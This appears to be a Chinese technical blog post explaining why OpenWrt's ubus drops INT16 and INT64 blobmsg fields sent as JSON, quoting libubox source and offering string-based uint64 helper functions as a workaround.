引用相关讨论 <a href="http://logs.nslu2-linux.org/livelogs/openwrt-devel/openwrt-devel.20151103.txt">http://logs.nslu2-linux.org/livelogs/openwrt-devel/openwrt-devel.20151103.txt</a>
</p>
<blockquote>
<p>
Nov 03 00:43:43 &lt;txomon&gt; So I think I found something strange in ubus, but I am not too sure. For some reason, declaring within a policy BLOBMSG_TYPE_INT16, won't be accepted, and blobmsg_get_u16 will return null
</p>

<p>
Nov 03 00:44:04 &lt;txomon&gt; I mean, it is accepted but it will refuse to work
</p>

<p>
Nov 03 00:44:17 &lt;txomon&gt; and in ubus -v list will appear as nil
</p>

<p>
Nov 03 00:45:00 &lt;txomon&gt; it will appear as "(unknown)"
</p>

<p>
Nov 03 00:47:17 &lt;txomon&gt; looking at the cli code, I understand why it appears as unknown, because int16 is not in there, but anyway, why doesn't it work for my client?
</p>

<p>
Nov 03 00:48:17 &lt;txomon&gt; It might be because ubus cli is not prepared to send uint16?
</p>

<p>
Nov 03 00:48:39 &lt;txomon&gt; (I always refer to BLOBMSG_TYPE_INT16)
</p>

<p>
Nov 03 00:51:44 &lt;txomon&gt; well, I understand it isn't because json doesn't have such thing as int16&#x2026; and indeed libubox/blobmsg_json.c L72 is just prepared for u32, but anyway, that means you can't use any datatype that doesn't match those ones!
</p>

<p>
Nov 03 00:52:03 &lt;txomon&gt; shouldn't ubus cli inspect the interface and then send the correct datatype through ubus?
</p>

<p>
Nov 03 00:55:27 &lt;txomon&gt; I suppose it's the same for uhttpd-mod-ubus
</p>

<p>
Nov 03 01:01:23 &lt;txomon&gt; I have checked and yeah&#x2026; so I will just use BLOBMSG_TYPE_INT32&#x2026;. why does ubus even support that then? :(
</p>
</blockquote>

<p>
这是因为 json 只有一种整型，json 转 blogmsg 会转成 BLOBMSG_TYPE_INT32，引用自 <code>blobmsg_json.c</code>
</p>
<div class="org-src-container">
<pre class="src src-C"><span style="color: #81a2be;">bool</span> <span style="color: #de935f;">blobmsg_add_json_element</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blob_buf</span> *<span style="color: #f0c674;">b</span>, <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">name</span>, <span style="color: #81a2be;">json_object</span> <span style="text-decoration: underline;">*</span><span style="color: #f0c674; text-decoration: underline;">obj</span><span style="text-decoration: underline;">)</span>
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">bool</span> <span style="color: #f0c674;">ret</span> = <span style="color: #81a2be;">true</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">void</span> *<span style="color: #f0c674;">c</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>obj)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">switch</span> (json_object_get_type(obj)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">case</span> json_type_object:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> c = blobmsg_open_table(b, name);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ret = blobmsg_add_object(b, obj);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> blobmsg_close_table(b, c);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">break</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">case</span> json_type_array:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> c = blobmsg_open_array(b, name);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ret = blobmsg_add_array(b, json_object_get_array(obj));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> blobmsg_close_array(b, c);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">break</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">case</span> json_type_string:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> blobmsg_add_string(b, name, json_object_get_string(obj));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">break</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">case</span> json_type_boolean:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> blobmsg_add_u8(b, name, json_object_get_boolean(obj));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">break</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">case</span> json_type_int:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> blobmsg_add_u32(b, name, json_object_get_int(obj));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">break</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">default</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">false</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> ret;
}
</pre>
</div>

<p>
而解析 blobmsg 时，因为与预定义类型 <code>blobmsg_policy</code> 不一致 <code>blob_id(attr) != policy[i].type</code> ，相应字段被丢弃，引用自 <code>blobmsg.c</code>
</p>
<div class="org-src-container">
<pre class="src src-C"><span style="color: #81a2be;">int</span> <span style="color: #de935f;">blobmsg_parse</span>(<span style="color: #b5bd68;">const</span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blobmsg_policy</span> *<span style="color: #f0c674;">policy</span>, <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">policy_len</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blob_attr</span> **<span style="color: #f0c674;">tb</span>, <span style="color: #81a2be;">void</span> *<span style="color: #f0c674;">data</span>, <span style="color: #81a2be;">unsigned</span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">len</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blobmsg_hdr</span> *<span style="color: #f0c674;">hdr</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blob_attr</span> *<span style="color: #f0c674;">attr</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">uint8_t</span> *<span style="color: #f0c674;">pslen</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">i</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> memset(tb, 0, <span style="color: #81a2be;">policy_len</span> * <span style="color: #b5bd68;">sizeof</span>(*tb));
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> pslen = alloca(policy_len);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">for</span> (i = 0; i &lt; policy_len; i++) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>policy[i].name)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">continue</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> pslen[i] = strlen(policy[i].name);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> __blob_for_each_attr(attr, data, len) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> hdr = blob_data(attr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">for</span> (i = 0; i &lt; policy_len; i++) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>policy[i].name)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">continue</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (policy[i].type != BLOBMSG_TYPE_UNSPEC &amp;&amp;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> blob_id(attr) != policy[i].type)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">continue</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (blobmsg_namelen(hdr) != pslen[i])
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">continue</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>blobmsg_check_attr(attr, <span style="color: #81a2be;">true</span>))
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> -1;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (tb[i])
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">continue</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (strcmp(policy[i].name, (<span style="color: #81a2be;">char</span> *) hdr-&gt;name) != 0)
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">continue</span>;

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> tb[i] = attr;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<p>
<code>ubus</code> 命令行工具以及 <code>uhttpd-mod-ubus</code> 以 json 做为请求格式，因此不支持 <code>BLOBMSG_TYPE_INT64</code> 和 <code>BLOBMSG_TYPE_INT16</code> 字段类型，数据类型定义 <code>blobmsg_policy</code> 需要做一下折衷：
</p>

<ul class="org-ul">
<li><code>BLOBMSG_TYPE_INT16</code> 改用 <code>BLOBMSG_TYPE_INT32</code></li>

<li><p>
<code>BLOBMSG_TYPE_INT64</code> 改用 <code>BLOBMSG_TYPE_STRING</code>
</p>

<p>
封装一下方便使用
</p>

<div class="org-src-container">
<pre class="src src-C"><span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* &#35299;&#26512;&#23383;&#31526;&#20018;&#24418;&#24335;&#20256;&#36882;&#30340; uint64_t &#28040;&#24687;&#23383;&#27573;&#20540;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* UBUS &#20256;&#36882; uint64_t &#31867;&#22411;&#23383;&#27573;&#23384;&#22312; </span><span style="color: #ff0000; background-color: #ffffff; font-weight: bold;">BUG</span><span style="color: #b294bb;">&#65292;&#38656;&#35201;&#20197;&#23383;&#31526;&#20018;&#24418;&#24335;&#20256;&#36882;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* &#29992;&#20110;&#26367;&#25442;</span><span style="color: #81a2be;">@ref</span><span style="color: #b294bb;"> blobmsg_get_u64.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> attr &#28040;&#24687;&#23383;&#27573;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@return</span><span style="color: #b294bb;"> &#28040;&#24687;&#23383;&#27573;&#20540;. </span><span style="color: #81a2be;">@ref</span><span style="color: #b294bb;"> blobmsg_get_string.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #b5bd68;">static</span> <span style="color: #b5bd68;">inline</span> <span style="color: #81a2be;">uint64_t</span>
<span style="color: #de935f;">blobmsg_get_u64string</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blob_attr</span> *<span style="color: #f0c674;">attr</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">str</span> = blobmsg_get_string(attr);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (str) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">end</span> = <span style="color: #81a2be;">NULL</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">uint64_t</span> <span style="color: #f0c674;">value</span> = strtoull(str, &amp;end, 10);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (end &amp;&amp; end[0] == <span style="color: #8abeb7;">'\0'</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> value;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> 0;
}

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* &#28155;&#21152;&#23383;&#31526;&#20018;&#24418;&#24335;&#20256;&#36882;&#30340; uint64_t &#28040;&#24687;&#23383;&#27573;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* UBUS &#20256;&#36882; uint64_t &#31867;&#22411;&#23383;&#27573;&#23384;&#22312; </span><span style="color: #ff0000; background-color: #ffffff; font-weight: bold;">BUG</span><span style="color: #b294bb;">&#65292;&#38656;&#35201;&#20197;&#23383;&#31526;&#20018;&#24418;&#24335;&#20256;&#36882;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* &#29992;&#20110;&#26367;&#25442;</span><span style="color: #81a2be;">@ref</span><span style="color: #b294bb;"> blobmsg_add_u64.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> buf &#28040;&#24687;&#32531;&#20914;&#21306;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> name &#28040;&#24687;&#23383;&#27573;&#21517;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> val &#28040;&#24687;&#23383;&#27573;&#20540;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@return</span><span style="color: #b294bb;"> &#26159;&#21542;&#25104;&#21151;. </span><span style="color: #81a2be;">@ref</span><span style="color: #b294bb;"> blobmsg_add_string.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #b5bd68;">static</span> <span style="color: #b5bd68;">inline</span> <span style="color: #81a2be;">int</span>
<span style="color: #de935f;">blobmsg_add_u64string</span>(<span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blob_buf</span> *<span style="color: #f0c674;">buf</span>, <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">name</span>, <span style="color: #81a2be;">uint64_t</span> <span style="color: #f0c674;">val</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">char</span> <span style="color: #f0c674;">value</span>[20 + 1] = {<span style="color: #8abeb7;">'\0'</span>};
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> snprintf(value, <span style="color: #b5bd68;">sizeof</span>(value), <span style="color: #8abeb7;">"%"</span>PRIu64, val);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> blobmsg_add_string(buf, name, value);
}
</pre>
</div></li>
</ul>


<p>
C 中 64 位整形的取值范围，见 <code>/usr/include/limits.h</code>
</p>
<div class="org-src-container">
<pre class="src src-C"><span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Minimum and maximum values a `signed long int' can hold.  </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #b294bb;">#  if</span> __WORDSIZE == 64
<span style="color: #b294bb;">#   define</span> <span style="color: #f0c674;">LONG_MAX</span>     9223372036854775807L
<span style="color: #b294bb;">#  else</span>
<span style="color: #b294bb;">#   define</span> <span style="color: #f0c674;">LONG_MAX</span>     2147483647L
<span style="color: #b294bb;">#  endif</span>
<span style="color: #b294bb;">#  define</span> <span style="color: #f0c674;">LONG_MIN</span>  (-LONG_MAX - 1L)

<span style="color: #969896; font-style: italic;">/* </span><span style="color: #969896; font-style: italic;">Maximum value an `unsigned long int' can hold.  (Minimum is 0.)  </span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #b294bb;">#  if</span> __WORDSIZE == 64
<span style="color: #b294bb;">#   define</span> <span style="color: #f0c674;">ULONG_MAX</span>    18446744073709551615UL
<span style="color: #b294bb;">#  else</span>
<span style="color: #b294bb;">#   define</span> <span style="color: #f0c674;">ULONG_MAX</span>    4294967295UL
<span style="color: #b294bb;">#  endif</span>
</pre>
</div>

<p>
JSON/JavaScript 中 64 位整形的取值范围，引用自 <a href="https://cdivilly.wordpress.com/2012/04/11/json-javascript-large-64-bit-integers/">JSON/JavaScript and large 64 bit integer values | The former blog of cdivilly</a>
</p>
<blockquote>
<p>
